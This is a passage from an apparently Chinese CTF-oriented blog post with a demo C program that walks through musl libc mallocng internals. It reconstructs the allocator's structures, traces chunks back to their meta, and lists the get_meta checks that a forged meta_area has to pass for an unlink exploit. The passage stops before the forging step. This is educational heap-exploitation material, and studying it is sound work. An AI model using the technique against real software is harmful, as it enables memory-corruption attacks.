get_meta(p);</span><br><span class="line">		<span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">		g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">		mi = nontrivial_free(m, idx);</span><br><span class="line">	&#125;</span><br><span class="line">	free_meta(g);</span><br><span class="line">	<span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们不能在if-else语句中跳转到else分支，那样会再一次调用<code>nontrivial_free</code>，因此要保证<code>meta</code>的<code>maplen</code>字段不为0。</p>
<p>这些检查与条件判断通过后，就可以成功释放假chunk了。</p>
<p>下面就是musl libc unlink漏洞的demo程序，如有任何非预期情况请与笔者联系，不胜感激。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> maplen:<span class="number">8</span>*<span class="number">8</span><span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[<span class="number">0x10</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> victim_1[<span class="number">0x8</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> victim_2[<span class="number">0x8</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* <span class="built_in">string</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> group* <span class="title function_">get_group</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* chunk)</span>&#123;</span><br><span class="line">    <span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> *)(chunk - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (chunk[<span class="number">-4</span>])</span><br><span class="line">        offset = *(<span class="type">unsigned</span> <span class="type">int</span> *)(chunk - <span class="number">8</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">group_addr</span> =</span> (<span class="type">void</span> *)(chunk - <span class="number">0x10</span>*offset - <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> group_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> meta* <span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* chunk)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">group_addr</span> =</span> get_group(chunk);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">meta_addr</span> =</span> group_addr-&gt;meta;</span><br><span class="line">    <span class="keyword">return</span> meta_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> meta_area* <span class="title function_">get_meta_area</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* meta)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> meta_area*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序用于演示musl libc中的unlink操作。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;测试环境：ubuntu 22.04，musl libc版本：1.2.2。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;鉴于musl libc的轻量性，与其相关的利用方式也较为单一。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序所演示的unlink是最为常用的一种利用方式之一。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;musl libc与glibc不同，在主程序的main函数开始执行时，内存分配器就已经完成了初始化。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;请注意：在一个group中分配出来的chunk很可能在地址空间上不相邻。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因为一个group需要确保每个chunk都能够容纳该范围内最大的chunk。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此，调试便是musl libc赛题的重中之重。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是刚刚进入main函数时堆的情况：\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;pwndbg&gt; mheap\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;          secret : 0xd8e803bc461ae35a\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    mmap_counter : 0x0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      avail_meta : 0x55555555a0e0 (count: 96)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;       free_meta : 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot; avail_meta_area : 0x55555555b000 (count: 0)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  meta_area_head : 0x55555555a000\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  meta_area_tail : 0x55555555a000\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;       active[7] : 0x55555555a090 (mem: 0x555555558f40) -&gt; 0x55555555a0b8 (mem: 0x7ffff7ffef40) [0x80]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[15] : 0x55555555a068 (mem: 0x555555558d40) [0x1f0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[19] : 0x55555555a040 (mem: 0x555555558940) [0x3f0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[23] : 0x55555555a018 (mem: 0x555555558140) [0x7f0]\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可见已经有一些meta被链入到链表数组之中了。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;但这对做题的影响并不大，通过多次调试，我们就能够让自己的chunk进入想要的meta。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;接下来让我们尝试分配几个chunk。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* chunks[<span class="number">14</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++) &#123;</span><br><span class="line">        chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x140</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;第&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> GREEN <span class="string">&quot;m%d\033[0m&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;次malloc返回的地址为：&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p\n\033[0m&quot;</span>, chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;\n接下来让我们用源码中给出的寻找chunk所在meta的方法回溯这些chunk所在的group和meta。\n&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">groups</span>[14];</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">metas</span>[14];</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++)&#123;</span><br><span class="line">        groups[i] = get_group(chunks[i]);</span><br><span class="line">        metas[i] = get_meta(chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++)&#123;</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;第&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> GREEN <span class="string">&quot;m%d\033[0m&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;次malloc获得chunk的group地址和meta地址分别为：&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p %p\n\033[0m&quot;</span>, groups[i], metas[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;通过nontrivial_free中的dequeue函数进行unlink，首先要通过get_meta函数的重重检查：\n\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/meta.h, line 129)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static inline struct meta *get_meta(const unsigned char *p)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!((uintptr_t)p &amp; 15));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint offset = *(const uint16_t *)(p - 2);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint index = get_slot_index(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (p[-4]) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(!offset);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\toffset = *(uint32_t *)(p - 8);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &gt; 0xffff);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct group *base = (const void *)(p - UNIT*offset - UNIT);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct meta *meta = base-&gt;meta;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(meta-&gt;mem == base);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(index &lt;= meta-&gt;last_idx);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!(meta-&gt;avail_mask &amp; (1u&lt;&lt;index)));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!(meta-&gt;freed_mask &amp; (1u&lt;&lt;index)));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct meta_area *area = (void *)((uintptr_t)meta &amp; -4096);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(area-&gt;check == ctx.secret);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (meta-&gt;sizeclass &lt; 48) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+1));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(meta-&gt;sizeclass == 63);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (meta-&gt;maplen) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn (struct meta *)meta;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面我们逐一查看一下这些检查的具体内容。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;1. meta-&gt;mem == base，即meta中保存的group指针要正确。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;2. index &lt;= meta-&gt;last_idx，即chunk的索引不能越界。\n&quot;</span>);</span><br><span class="line">    printf_color(RED   , HIGHLIGHT, <span class="string">&quot;3. area-&gt;check == ctx.secret，即meta所在的meta_area的校验值正确。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;4. offset &gt;= size_classes[meta-&gt;sizeclass]*index\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;5. offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)，这两个检查offset和chunk大小是否对应。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;6. assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);，即检查offset是否越界。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这些检查之中对我们最为重要的就是校验值的检查。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;只有泄露出secret值，我们才能释放伪造meta_area中伪造meta的group的chunk。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span>* <span class="title">area</span> =</span> get_meta_area(metas[<span class="number">0</span>]);</span><br><span class="line">    printf_color(GREEN, 